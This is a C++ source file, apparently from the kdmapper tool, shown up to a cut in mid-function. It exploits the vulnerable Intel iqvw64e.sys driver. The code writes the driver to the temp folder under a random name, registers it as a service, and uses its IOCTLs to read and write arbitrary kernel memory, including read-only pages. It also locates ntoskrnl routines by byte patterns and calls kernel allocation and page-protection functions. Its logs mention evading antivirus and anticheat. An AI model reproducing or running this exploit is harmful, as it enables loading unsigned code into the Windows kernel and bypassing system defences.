#include "intel_driver.hpp"
#include <Windows.h>
#include <string>
#include <atomic>
#include <cerrno>
#include <limits>
#include <mutex>
#include <optional>

#include "utils.hpp"
#include "intel_driver_resource.hpp"
#include "service.hpp"
#include "nt.hpp"
#include "portable_executable.hpp"

#ifdef PDB_OFFSETS
#include "KDSymbolsHandler.h"
#endif

/**
 Command structures
*/
typedef struct _COPY_MEMORY_BUFFER_INFO
{
	uint64_t case_number;
	uint64_t reserved;
	uint64_t source;
	uint64_t destination;
	uint64_t length;
}COPY_MEMORY_BUFFER_INFO, * PCOPY_MEMORY_BUFFER_INFO;

typedef struct _FILL_MEMORY_BUFFER_INFO
{
	uint64_t case_number;
	uint64_t reserved1;
	uint32_t value;
	uint32_t reserved2;
	uint64_t destination;
	uint64_t length;
}FILL_MEMORY_BUFFER_INFO, * PFILL_MEMORY_BUFFER_INFO;

typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO
{
	uint64_t case_number;
	uint64_t reserved;
	uint64_t return_physical_address;
	uint64_t address_to_translate;
}GET_PHYS_ADDRESS_BUFFER_INFO, * PGET_PHYS_ADDRESS_BUFFER_INFO;

typedef struct _MAP_IO_SPACE_BUFFER_INFO
{
	uint64_t case_number;
	uint64_t reserved;
	uint64_t return_value;
	uint64_t return_virtual_address;
	uint64_t physical_address_to_map;
	uint32_t size;
}MAP_IO_SPACE_BUFFER_INFO, * PMAP_IO_SPACE_BUFFER_INFO;

typedef struct _UNMAP_IO_SPACE_BUFFER_INFO
{
	uint64_t case_number;
	uint64_t reserved1;
	uint64_t reserved2;
	uint64_t virt_address;
	uint64_t reserved3;
	uint32_t number_of_bytes;
}UNMAP_IO_SPACE_BUFFER_INFO, * PUNMAP_IO_SPACE_BUFFER_INFO;

// End Command structures

HANDLE intel_driver::hDevice = 0;
ULONG64 intel_driver::ntoskrnlAddr = 0;
std::string cachedDriverName = "";
namespace {
std::mutex kernel_call_mutex;
std::atomic_bool kernel_call_trampoline_unverified{ false };
std::atomic_bool helper_service_stopped{ false };
std::mutex independent_page_mutex;
bool independent_page_exact_only = false;
intel_driver::independent_page_rvas verified_independent_page_rvas{};

std::optional<uint64_t> exact_independent_page_target(intel_driver::detail::independent_page_api api) {
	std::lock_guard<std::mutex> lock(independent_page_mutex);
	return intel_driver::detail::SelectIndependentPageTarget(
		independent_page_exact_only, intel_driver::ntoskrnlAddr,
		verified_independent_page_rvas, api);
}

bool is_executable_ntoskrnl_address(uint64_t address) {
	auto const base = intel_driver::ntoskrnlAddr;
	if (!base || address < base) return false;
	IMAGE_DOS_HEADER dos{};
	if (!intel_driver::ReadMemory(base, &dos, sizeof(dos)) ||
		dos.e_magic != IMAGE_DOS_SIGNATURE || dos.e_lfanew <= 0 || dos.e_lfanew > 0x1000)
		return false;
	IMAGE_NT_HEADERS64 nt{};
	if (!intel_driver::ReadMemory(base + dos.e_lfanew, &nt, sizeof(nt)) ||
		nt.Signature != IMAGE_NT_SIGNATURE ||
		nt.OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC ||
		nt.FileHeader.NumberOfSections == 0 || nt.FileHeader.NumberOfSections > 96 ||
		nt.FileHeader.SizeOfOptionalHeader < sizeof(IMAGE_OPTIONAL_HEADER64) ||
		nt.FileHeader.SizeOfOptionalHeader > 0x1000 ||
		address - base >= nt.OptionalHeader.SizeOfImage)
		return false;
	auto const section_table_rva = static_cast<uint64_t>(dos.e_lfanew) +
		offsetof(IMAGE_NT_HEADERS64, OptionalHeader) + nt.FileHeader.SizeOfOptionalHeader;
	if (section_table_rva >= nt.OptionalHeader.SizeOfImage ||
		nt.FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER) >
			nt.OptionalHeader.SizeOfImage - section_table_rva)
		return false;
	auto const section_table = base + section_table_rva;
	for (unsigned i = 0; i < nt.FileHeader.NumberOfSections; ++i) {
		IMAGE_SECTION_HEADER section{};
		if (!intel_driver::ReadMemory(section_table + i * sizeof(section), &section, sizeof(section)))
			return false;
		if (!(section.Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
		auto const span = section.Misc.VirtualSize > section.SizeOfRawData
			? section.Misc.VirtualSize : section.SizeOfRawData;
		auto const rva = address - base;
		if (section.VirtualAddress >= nt.OptionalHeader.SizeOfImage ||
			span > nt.OptionalHeader.SizeOfImage - section.VirtualAddress)
			continue;
		if (rva >= section.VirtualAddress && rva - section.VirtualAddress < span)
			return true;
	}
	return false;
}

uint64_t resolve_ntoskrnl_call(uint64_t call_site) {
	uint8_t opcode = 0;
	if (!is_executable_ntoskrnl_address(call_site) ||
		!intel_driver::ReadMemory(call_site, &opcode, sizeof(opcode)) || opcode != 0xe8)
		return 0;
	auto const target = reinterpret_cast<uint64_t>(
		intel_driver::ResolveRelativeAddress(reinterpret_cast<void*>(call_site), 1, 5));
	return is_executable_ntoskrnl_address(target) ? target : 0;
}

}

std::mutex& intel_driver::KernelCallMutex() {
	return kernel_call_mutex;
}

bool intel_driver::IsKernelCallTrampolineIntact() {
	return !kernel_call_trampoline_unverified.load(std::memory_order_acquire);
}

void intel_driver::MarkKernelCallTrampolineUnverified() {
	kernel_call_trampoline_unverified.store(true, std::memory_order_release);
}

bool intel_driver::ConfigureIndependentPageRvas(independent_page_rvas rvas) {
	std::lock_guard<std::mutex> lock(independent_page_mutex);
	verified_independent_page_rvas = {};
	if (!independent_page_exact_only || !hDevice || hDevice == INVALID_HANDLE_VALUE ||
		!ntoskrnlAddr || !detail::CompleteIndependentPageRvas(rvas))
		return false;
	for (uint32_t rva : {rvas.allocate, rvas.protect, rvas.free}) {
		if (ntoskrnlAddr > (std::numeric_limits<uint64_t>::max)() - rva ||
			!is_executable_ntoskrnl_address(ntoskrnlAddr + rva))
			return false;
	}
	verified_independent_page_rvas = rvas;
	return true;
}

bool intel_driver::RestoreKernelCallTrampoline(uint64_t address, const uint8_t* original, uint32_t size) {
	return detail::RestoreKernelCallTrampolineWith(address, original, size,
		ReadMemory, WriteToReadOnlyMemory);
}

std::wstring intel_driver::GetDriverNameW() {
	if (cachedDriverName.empty()) {
		//Create a random name
		char buffer[100]{};
		static const char alphanum[] =
			"abcdefghijklmnopqrstuvwxyz"
			"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
		int len = rand() % 20 + 10;
		for (int i = 0; i < len; ++i)
			buffer[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
		cachedDriverName = buffer;
	}

	std::wstring name(cachedDriverName.begin(), cachedDriverName.end());
	return name;
}

std::wstring intel_driver::GetDriverPath() {
	std::wstring temp = kdmUtils::GetFullTempPath();
	if (temp.empty()) {
		return L"";
	}
	return temp + L"\\" + GetDriverNameW();
}

bool intel_driver::IsRunning() {
	const HANDLE file_handle = CreateFileW(L"\\\\.\\Nal", FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (file_handle != nullptr && file_handle != INVALID_HANDLE_VALUE)
	{
		CloseHandle(file_handle);
		return true;
	}
	return false;
}

//get Se debug privilege
NTSTATUS intel_driver::AcquireDebugPrivilege() {

	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	if (ntdll == NULL) {
		return STATUS_UNSUCCESSFUL;
	}

	ULONG SE_DEBUG_PRIVILEGE = 20UL;
	BOOLEAN SeDebugWasEnabled;
	NTSTATUS Status = nt::RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &SeDebugWasEnabled);
	if (!NT_SUCCESS(Status)) {
		kdmLog("[-] Failed to acquire SE_DEBUG_PRIVILEGE" << std::endl);
	}
	return Status;
}

NTSTATUS intel_driver::Load() {
	return Load(nullptr, nullptr);
}

NTSTATUS intel_driver::Load(symbol_provider provider, void* context) {
	if (!IsKernelCallTrampolineIntact()) {
		kdmLog(L"[-] NtAddAtom restoration is unverified in this process" << std::endl);
		return STATUS_UNSUCCESSFUL;
	}
	srand((unsigned)time(NULL) * GetCurrentThreadId());

	//from https://github.com/ShoaShekelbergstein/kdmapper as some Drivers takes same device name
	if (intel_driver::IsRunning()) {
		kdmLog(L"[-] \\Device\\Nal is already in use." << std::endl);
		kdmLog(L"[-] This means that there is a intel driver already loaded or another instance of kdmapper is running or kdmapper crashed and didn't unload the previous driver." << std::endl);
		kdmLog(L"[-] If you are sure that there is no other instance of kdmapper running, you can try to restart your computer to fix this issue." << std::endl);
		kdmLog(L"[-] If the problem persists, you can try to unload the intel driver manually (If the driver was loaded with kdmapper will have a random name and will be located in %temp%), if not, the driver name is iqvw64e.sys." << std::endl);
		return STATUS_ALREADY_REGISTERED;
	}

	kdmLog(L"[<] Loading vulnerable driver, Name: " << GetDriverNameW() << std::endl);

	std::wstring driver_path = GetDriverPath();
	if (driver_path.empty()) {
		kdmLog(L"[-] Can't find TEMP folder" << std::endl);
		return STATUS_UNSUCCESSFUL;
	}

	if (!kdmUtils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(intel_driver_resource::driver), sizeof(intel_driver_resource::driver))) {
		kdmLog(L"[-] Failed to create a new helper driver file" << std::endl);
		return STATUS_DISK_OPERATION_FAILED;
	}

	auto status = AcquireDebugPrivilege();
	if (!NT_SUCCESS(status)) {
		kdmLog(L"[-] Failed to acquire SeDebugPrivilege" << std::endl);
		_wremove(driver_path.c_str());
		return status;
	}

	status = service::RegisterAndStart(driver_path, GetDriverNameW());
	if (!NT_SUCCESS(status)) {
		kdmLog(L"[-] Failed to register and start service for the vulnerable driver" << std::endl);
		// NtLoadDriver or registry cleanup may have failed after the service key
		// was created. Keep the helper file for inspection/retry in that case.
		kdmLog(L"[-] Helper file retained at " << driver_path << std::endl);
		return status;
	}
	helper_service_stopped.store(false, std::memory_order_release);

	hDevice = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (!hDevice || hDevice == INVALID_HANDLE_VALUE)
	{
		kdmLog(L"[-] Failed to load driver iqvw64e.sys" << std::endl);
		auto const cleanup = intel_driver::Unload();
		if (!NT_SUCCESS(cleanup)) return cleanup;
		return STATUS_NOT_FOUND;
	}

	ntoskrnlAddr = kdmUtils::GetKernelModuleAddress("ntoskrnl.exe");
	if (ntoskrnlAddr == 0) {
		kdmLog(L"[-] Failed to get ntoskrnl.exe" << std::endl);
		auto const cleanup = intel_driver::Unload();
		if (!NT_SUCCESS(cleanup)) return cleanup;
		return STATUS_BAD_DLL_ENTRYPOINT;
	}

	//check MZ ntoskrnl.exe
	IMAGE_DOS_HEADER dosHeader = { 0 };
	if (!intel_driver::ReadMemory(intel_driver::ntoskrnlAddr, &dosHeader, sizeof(IMAGE_DOS_HEADER)) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
		kdmLog(L"[-] Can't exploit intel driver, is there any antivirus or anticheat running?" << std::endl);
		auto const cleanup = intel_driver::Unload();
		if (!NT_SUCCESS(cleanup)) return cleanup;
		return STATUS_INVALID_IMAGE_FORMAT;
	}
	{
		std::lock_guard<std::mutex> lock(independent_page_mutex);
		verified_independent_page_rvas = {};
		independent_page_exact_only = provider != nullptr;
	}
	// The callback resolves the loaded kernel's symbols and configures the
	// independent-page targets before a mapped image can be created or stopped.
	if (provider) {
		(void)provider(context);
		bool ready = false;
		{
			std::lock_guard<std::mutex> lock(independent_page_mutex);
			ready = detail::CompleteIndependentPageRvas(verified_independent_page_rvas);
		}
		if (!ready) {
			kdmLog(L"[-] Exact-image independent-page symbols are unavailable; helper mapping is refused" << std::endl);
			auto const cleanup = intel_driver::Unload();
			if (!NT_SUCCESS(cleanup)) return cleanup;
			return independent_page_symbols_unavailable_status;
		}
	}

	// Leave Windows' driver-load records intact. The private cache/list cleanup
	// routines are not part of helper load or unload and are version-sensitive.
	return STATUS_SUCCESS;
}

NTSTATUS intel_driver::Unload() {
	std::lock_guard<std::mutex> call_lock(KernelCallMutex());
	kdmLog(L"[<] Unloading vulnerable driver" << std::endl);
	if (!IsKernelCallTrampolineIntact()) {
		kdmLog(L"[-] NtAddAtom restoration is unverified; retaining the helper for recovery" << std::endl);
		return STATUS_UNSUCCESSFUL;
	}

	if (hDevice && hDevice != INVALID_HANDLE_VALUE) {
		CloseHandle(hDevice);
		hDevice = nullptr;
	}

	bool stopped = helper_service_stopped.load(std::memory_order_acquire);
	auto const status = service::StopAndRemove(GetDriverNameW(), stopped, &stopped);
	if (stopped) helper_service_stopped.store(true, std::memory_order_release);
	if (!NT_SUCCESS(status)) return status;

	std::wstring driver_path = GetDriverPath();
	// The helper is no longer loaded. Remove only the file this invocation
	// created; preserve it and the service key if NtUnloadDriver failed.
	if (driver_path.empty() ||
		(_wremove(driver_path.c_str()) != 0 && errno != ENOENT))
		return STATUS_DELETE_PENDING;

	return STATUS_SUCCESS;
}

bool intel_driver::MemCopy(uint64_t destination, uint64_t source, uint64_t size) {
	if (!destination || !source || !size)
		return 0;

	COPY_MEMORY_BUFFER_INFO copy_memory_buffer = { 0 };

	copy_memory_buffer.case_number = 0x33;
	copy_memory_buffer.source = source;
	copy_memory_buffer.destination = destination;
	copy_memory_buffer.length = size;

	DWORD bytes_returned = 0;
	return DeviceIoControl(hDevice, ioctl1, &copy_memory_buffer, sizeof(copy_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
}

bool intel_driver::SetMemory(uint64_t address, uint32_t value, uint64_t size) {
	if (!address || !size)
		return 0;

	FILL_MEMORY_BUFFER_INFO fill_memory_buffer = { 0 };

	fill_memory_buffer.case_number = 0x30;
	fill_memory_buffer.destination = address;
	fill_memory_buffer.value = value;
	fill_memory_buffer.length = size;

	DWORD bytes_returned = 0;
	return DeviceIoControl(hDevice, ioctl1, &fill_memory_buffer, sizeof(fill_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
}

bool intel_driver::GetPhysicalAddress(uint64_t address, uint64_t* out_physical_address) {
	if (!address)
		return 0;

	GET_PHYS_ADDRESS_BUFFER_INFO get_phys_address_buffer = { 0 };

	get_phys_address_buffer.case_number = 0x25;
	get_phys_address_buffer.address_to_translate = address;

	DWORD bytes_returned = 0;

	if (!DeviceIoControl(hDevice, ioctl1, &get_phys_address_buffer, sizeof(get_phys_address_buffer), nullptr, 0, &bytes_returned, nullptr))
		return false;

	*out_physical_address = get_phys_address_buffer.return_physical_address;
	return true;
}

uint64_t intel_driver::MapIoSpace(uint64_t physical_address, uint32_t size) {
	if (!physical_address || !size)
		return 0;

	MAP_IO_SPACE_BUFFER_INFO map_io_space_buffer = { 0 };

	map_io_space_buffer.case_number = 0x19;
	map_io_space_buffer.physical_address_to_map = physical_address;
	map_io_space_buffer.size = size;

	DWORD bytes_returned = 0;

	if (!DeviceIoControl(hDevice, ioctl1, &map_io_space_buffer, sizeof(map_io_space_buffer), nullptr, 0, &bytes_returned, nullptr))
		return 0;

	return map_io_space_buffer.return_virtual_address;
}

bool intel_driver::UnmapIoSpace(uint64_t address, uint32_t size) {
	if (!address || !size)
		return false;

	UNMAP_IO_SPACE_BUFFER_INFO unmap_io_space_buffer = { 0 };

	unmap_io_space_buffer.case_number = 0x1A;
	unmap_io_space_buffer.virt_address = address;
	unmap_io_space_buffer.number_of_bytes = size;

	DWORD bytes_returned = 0;

	return DeviceIoControl(hDevice, ioctl1, &unmap_io_space_buffer, sizeof(unmap_io_space_buffer), nullptr, 0, &bytes_returned, nullptr);
}

bool intel_driver::ReadMemory(uint64_t address, void* buffer, uint64_t size) {
	return MemCopy(reinterpret_cast<uint64_t>(buffer), address, size);
}

bool intel_driver::WriteMemory(uint64_t address, void* buffer, uint64_t size) {
	return MemCopy(address, reinterpret_cast<uint64_t>(buffer), size);
}

bool intel_driver::WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size) {
	if (!address || !buffer || !size)
		return false;

	uint64_t physical_address = 0;

	if (!GetPhysicalAddress(address, &physical_address)) {
		kdmLog(L"[-] Failed to translate virtual address 0x" << reinterpret_cast<void*>(address) << std::endl);
		return false;
	}

	const uint64_t mapped_physical_memory = MapIoSpace(physical_address, size);

	if (!mapped_physical_memory) {
		kdmLog(L"[-] Failed to map IO space of 0x" << reinterpret_cast<void*>(physical_address) << std::endl);
		return false;
	}

	bool const written = WriteMemory(mapped_physical_memory, buffer, size);
	bool const unmapped = UnmapIoSpace(mapped_physical_memory, size);
	if (!unmapped)
		kdmLog(L"[!] Failed to unmap IO space of physical address 0x" << reinterpret_cast<void*>(physical_address) << std::endl);
	return written && unmapped;
}

intel_driver::kernel_allocation_result intel_driver::MmAllocateIndependentPagesExDetailed(uint32_t size)
{
	kernel_allocation_result allocation{};
	if (auto const target = exact_independent_page_target(detail::independent_page_api::allocate)) {
		if (!*target || !is_executable_ntoskrnl_address(*target)) {
			kdmLog(L"[!] Verified MmAllocateIndependentPagesEx target is unavailable" << std::endl);
			return allocation;
		}
		allocation.call = CallKernelFunctionDetailed(&allocation.address, *target, size, -1, 0, 0);
		return allocation;
	}

	static uint64_t kernel_MmAllocateIndependentPagesEx = 0;

#ifdef PDB_OFFSETS	
	if (!kernel_MmAllocateIndependentPagesEx)
	{
		kernel_MmAllocateIndependentPagesEx = KDSymbolsHandler::GetInstance()->GetOffset(L"MmAllocateIndependentPagesEx");
		if (!kernel_MmAllocateIndependentPagesEx) {
			kdmLog(L"[!] Failed to find MmAllocateIndependentPagesEx" << std::endl);
			return allocation;
		}
		kernel_MmAllocateIndependentPagesEx += intel_driver::ntoskrnlAddr;
	}
#else
	if (!kernel_MmAllocateIndependentPagesEx)
	{
		//Updated, tested from 1803 to 24H2
		//KeAllocateInterrupt -> 41 8B D6 B9 00 10 00 00 E8 ?? ?? ?? ?? 48 8B D8
		kernel_MmAllocateIndependentPagesEx = intel_driver::FindPatternInSectionAtKernel((char*)".text", intel_driver::ntoskrnlAddr,
			(BYTE*)"\x41\x8B\xD6\xB9\x00\x10\x00\x00\xE8\x00\x00\x00\x00\x48\x8B\xD8",
			(char*)"xxxxxxxxx????xxx");
		if (!kernel_MmAllocateIndependentPagesEx) {
			kdmLog(L"[!] Failed to find MmAllocateIndependentPagesEx" << std::endl);
			return allocation;
		}

		kernel_MmAllocateIndependentPagesEx += 8;

		kernel_MmAllocateIndependentPagesEx = resolve_ntoskrnl_call(kernel_MmAllocateIndependentPagesEx);
		if (!kernel_MmAllocateIndependentPagesEx) {
			kdmLog(L"[!] Failed to find MmAllocateIndependentPagesEx" << std::endl);
			return allocation;
		}
	}
#endif
	if (!is_executable_ntoskrnl_address(kernel_MmAllocateIndependentPagesEx)) {
		kdmLog(L"[!] MmAllocateIndependentPagesEx target is not executable ntoskrnl code" << std::endl);
		return allocation;
	}

	allocation.call = intel_driver::CallKernelFunctionDetailed(&allocation.address,
		kernel_MmAllocateIndependentPagesEx, size, -1, 0, 0);
	return allocation;
}

uint64_t intel_driver::MmAllocateIndependentPagesEx(uint32_t size)
{
	auto const allocation = MmAllocateIndependentPagesExDetailed(size);
	return allocation.call.target_invoked && allocation.call.trampoline_intact
		? allocation.address : 0;
}

intel_driver::kernel_call_result intel_driver::MmFreeIndependentPagesDetailed(uint64_t address, uint32_t size)
{
	if (auto const target = exact_independent_page_target(detail::independent_page_api::free)) {
		if (!*target || !is_executable_ntoskrnl_address(*target)) {
			kdmLog(L"[!] Verified MmFreeIndependentPages target is unavailable" << std::endl);
			return {};
		}
		uint64_t result{};
		return CallKernelFunctionDetailed(&result, *target, address, size);
	}

	static uint64_t kernel_MmFreeIndependentPages = 0;

	if (!kernel_MmFreeIndependentPages)
	{
#ifdef PDB_OFFSETS	
		kernel_MmFreeIndependentPages = KDSymbolsHandler::GetInstance()->GetOffset(L"MmFreeIndependentPages");
		if (!kernel_MmFreeIndependentPages) {
			kdmLog(L"[!] Failed to find MmFreeIndependentPages" << std::endl);
			return {};
		}
		kernel_MmFreeIndependentPages += intel_driver::ntoskrnlAddr;
#else
		kernel_MmFreeIndependentPages = intel_driver::FindPatternInSectionAtKernel("PAGE", intel_driver::ntoskrnlAddr,
			(BYTE*)"\xBA\x00\x60\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B\x00\xF0\xFF\xFF",
			(char*)"xxxxxxxxx????xxxxxxx");
		if (!kernel_MmFreeIndependentPages) {

			kdmLog(L"[+] Trying second pattern for MmFreeIndependentPages" << std::endl);

			// Windows 11
			kernel_MmFreeIndependentPages = intel_driver::FindPatternInSectionAtKernel("PAGE", intel_driver::ntoskrnlAddr,
				(BYTE*)"\x8B\x15\x00\x00\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B",
				(char*)"xx????xxxx????xxx");

			if (!kernel_MmFreeIndependentPages) {
				kdmLog(L"[!] Failed to find MmFreeIndependentPages" << std::endl);
				return {};
			}

			kernel_MmFreeIndependentPages += 9; // win 11
		}
		else {
			kernel_MmFreeIndependentPages += 8;
		}

		kernel_MmFreeIndependentPages = resolve_ntoskrnl_call(kernel_MmFreeIndependentPages);
		if (!kernel_MmFreeIndependentPages) {
			kdmLog(L"[!] Failed to find MmFreeIndependentPages" << std::endl);
			return {};
		}
#endif
	}
	if (!is_executable_ntoskrnl_address(kernel_MmFreeIndependentPages)) {
		kdmLog(L"[!] MmFreeIndependentPages target is not executable ntoskrnl code" << std::endl);
		return {};
	}

	uint64_t result{};
	return intel_driver::CallKernelFunctionDetailed(&result, kernel_MmFreeIndependentPages, address, size);
}

bool intel_driver::MmFreeIndependentPages(uint64_t address, uint32_t size)
{
	auto const result = MmFreeIndependentPagesDetailed(address, size);
	return result.target_invoked && result.trampoline_intact;
}

BOOLEAN intel_driver::MmSetPageProtection(uint64_t address, uint32_t size, ULONG new_protect)
{
	if (!address)
	{
		kdmLog(L"[!] Invalid address passed to MmSetPageProtection" << std::endl);
		return FALSE;
	}
	if (auto const target = exact_independent_page_target(detail::independent_page_api::protect)) {
		if (!*target || !is_executable_ntoskrnl_address(*target)) {
			kdmLog(L"[!] Verified MmSetPageProtection target is unavailable" << std::endl);
			return FALSE;
		}
		BOOLEAN status{};
		return CallKernelFunction(&status, *target, address, size, new_protect) ? status : FALSE;
	}

	static uint64_t kernel_MmSetPageProtection = 0;
	
	if (!kernel_MmSetPageProtection)
	{
#ifdef PDB_OFFSETS	
		kernel_MmSetPageProtection = KDSymbolsHandler::GetInstance()->GetOffset(L"MmSetPageProtection");
		if (!kernel_MmSetPageProtection) {
			kdmLog(L"[!] Failed to find MmSetPageProtection" << std::endl);
			return FALSE;
		}
		kernel_MmSetPageProtection += intel_driver::ntoskrnlAddr;
#else
		//Updated, tested from 1803 to 24H2
		//  0F 45 ? ? 8D ? ? ? FF FF E8
		//  0F 45 ? ? 45 8B ? ? ? ? 8D ? ? ? ? ? ? FF FF E8  (Some windows builds have a instruction in the middle)
		kernel_MmSetPageProtection = intel_driver::FindPatternInSectionAtKernel("PAGELK", intel_driver::ntoskrnlAddr, 
			(BYTE*)"\x0F\x45\x00\x00\x8D\x00\x00\x00\xFF\xFF\xE8",
			(char*)"xx??x???xxx");
		if (!kernel_MmSetPageProtection) {

			static constexpr char fallback_pattern[] =
				"\x0F\x45\x00\x00\x45\x8B\x00\x00\x00\x00\x8D\x00\x00\x00\x00\x00\x00\xFF\xFF\xE8";
			static constexpr char fallback_mask[] = "xx??xx????x??????xxx";
			static_assert(sizeof(fallback_pattern) == sizeof(fallback_mask), "protection signature length");
			static_assert(static_cast<unsigned char>(fallback_pattern[19]) == 0xe8, "protection call offset");
			kernel_MmSetPageProtection = intel_driver::FindPatternInSectionAtKernel("PAGELK", intel_driver::ntoskrnlAddr,
				(BYTE*)fallback_pattern, (char*)fallback_mask);

			if (!kernel_MmSetPageProtection) {
				kdmLog(L"[!] Failed to find MmSetPageProtection" << std::endl);
				return FALSE;
			}

			kernel_MmSetPageProtection += 19; // address of the E8 in the second pattern
		}
		else {
			kernel_MmSetPageProtection += 10;
		}

		kernel_MmSetPageProtection = resolve_ntoskrnl_call(kernel_MmSetPageProtection);
		if (!kernel_MmSetPageProtection) {
			kdmLog(L"[!] Failed to find MmSetPageProtection" << std::endl);
			return FALSE;
		}
#endif
	}
	if (!is_executable_ntoskrnl_address(kernel_MmSetPageProtection)) {
		kdmLog(L"[!] MmSetPageProtection target is not executable ntoskrnl code" << std::endl);
		return FALSE;
	}

	BOOLEAN set_prot_status{};
	if (!intel_driver::CallKernelFunction(&set_prot_status, kernel_MmSetPageProtection, address, size, new_protect))
		return FALSE;

	return set_prot_status;
}

intel_driver::kernel_allocation_result intel_driver::AllocatePoolDetailed(nt::POOL_TYPE pool_type, uint64_t size) {
	kernel_allocation_result allocation{};
	if (!size)
		return allocation;

	static uint64_t kernel_ExAllocatePool = GetKernelModuleExport(intel_driver::ntoskrnlAddr, "ExAllocatePoolWithTag");

	if (!kernel_ExAllocatePool) {
		kdmLog(L"[!] Failed to find ExAllocatePool" << std::endl);
		return allocation;
	}

	allocation.call = CallKernelFunctionDetailed(&allocation.address, kernel_ExAllocatePool,
		pool_type, size, 'BwtE');
	return allocation;
}

uint64_t intel_driver::AllocatePool(nt::POOL_TYPE pool_type, uint64_t size) {
	auto const allocation = AllocatePoolDetailed(pool_type, size);
	return allocation.call.target_invoked && allocation.call.trampoline_intact
		? allocation.address : 0;
}

intel_driver::kernel_call_result intel_driver::FreePoolDetailed(uint64_t address) {
	if (!address)
		return {};

	static uint64_t kernel_ExFreePool = GetKernelModuleExport(intel_driver::ntoskrnlAddr, "ExFreePool");

	if (!kernel_ExFreePool) {
		kdmLog(L"[!] Failed to find ExFreePool" << std::endl);
		return {};
	}

	return CallKernelFunctionDetailed<void>(nullptr, kernel_ExFreePool, address);
}

bool intel_driver::FreePool(uint64_t address) {
	auto const result = FreePoolDetailed(address);
	return result.target_invoked && result.trampoline_intact;
}

uint64_t intel_driver::GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name) {
	if (!kernel_module_base)
		return 0;

	IMAGE_DOS_HEADER dos_header = { 0 };
	IMAGE_NT_HEADERS64 nt_headers = { 0 };

	if (!ReadMemory(kernel_module_base, &dos_header, sizeof(dos_header)) || dos_header.e_magic != IMAGE_DOS_SIGNATURE ||
		!ReadMemory(kernel_module_base + dos_header.e_lfanew, &nt_headers, sizeof(nt_headers)) || nt_headers.Signature != IMAGE_NT_SIGNATURE)
		return 0;

	const auto export_base = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	const auto export_base_size = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	if (!export_base || !export_base_size)
		return 0;

	const auto export_data = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(VirtualAlloc(nullptr, export_base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

	if (!ReadMemory(kernel_module_base + export_base, export_data, export_base_size))
	{
		VirtualFree(export_data, 0, MEM_RELEASE);
		return 0;
	}

	const auto delta = reinterpret_cast<uint64_t>(export_data) - export_base;

	const auto name_table = reinterpret_cast<uint32_t*>(export_data->AddressOfNames + delta);
	const auto ordinal_table = reinterpret_cast<uint16_t*>(export_data->AddressOfNameOrdinals + delta);
	const auto function_table = reinterpret_cast<uint32_t*>(export_data->AddressOfFunctions + delta);

	for (auto i = 0u; i < export_data->NumberOfNames; ++i) {
		const std::string current_function_name = std::string(reinterpret_cast<char*>(name_table[i] + delta));

		if (!_stricmp(current_function_name.c_str(), function_name.c_str())) {
			const auto function_ordinal = ordinal_table[i];
			if (function_table[function_ordinal] <= 0x1000) {
				// Wrong function address?
				return 0;
			}
			const auto function_address = kernel_module_base + function_table[function_ordinal];

			if (function_address >= kernel_module_base + export_base && function_address <= kernel_module_base + export_base + export_base_size) {
				VirtualFree(export_data, 0, MEM_RELEASE);
				return 0; // No forwarded exports on 64bit?
			}

			VirtualFree(export_data, 0, MEM_RELEASE);
			return function_address;
		}
	}

	VirtualFree(export_data, 0, MEM_RELEASE);
	return 0;
}

PVOID intel_driver::ResolveRelativeAddress(_In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize) {
	ULONG_PTR Instr = (ULONG_PTR)Instruction;
	LONG RipOffset = 0;
	if (!ReadMemory(Instr + OffsetOffset, &RipOffset, sizeof(LONG))) {
		return nullptr;
	}
	PVOID ResolvedAddr = (PVOID)(Instr + InstructionSize + RipOffset);
	return ResolvedAddr;
}

uintptr_t intel_driver::FindPatternAtKernel(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask) {
	if (!dwAddress) {
		kdmLog(L"[-] No module address to find pattern" << std::endl);
		return 0;
	}

	if (dwLen > 1024 * 1024 * 1024) { //if read is > 1GB
		kdmLog(L"[-] Can't find pattern, Too big section" << std::endl);
		return 0;
	}

	auto sectionData = std::make_unique<BYTE[]>(dwLen);
	if (!ReadMemory(dwAddress, sectionData.get(), dwLen)) {
		kdmLog(L"[-] Read failed in FindPatternAtKernel" << std::endl);
		return 0;
	}

	auto result = kdmUtils::FindPattern((uintptr_t)sectionData.get(), dwLen, bMask, szMask);

	if (result <= 0) {
		return 0;
	}
	result = dwAddress - (uintptr_t)sectionData.get() + result;
	return result;
}

uintptr_t intel_driver::FindSectionAtKernel(const char* sectionName, uintptr_t modulePtr, PULONG size) {
	if (!modulePtr)
		return 0;
	BYTE headers[0x1000];
	if (!ReadMemory(modulePtr, headers, 0x1000)) {
		kdmLog(L"[-] Can't read module headers" << std::endl);
		return 0;
	}
	ULONG sectionSize = 0;
	uintptr_t section = (uintptr_t)kdmUtils::FindSection(sectionName, (uintptr_t)headers, &sectionSize);
	if (!section || !sectionSize) {
		kdmLog(L"[-] Can't find section" << std::endl);
		return 0;
	}
	if (size)
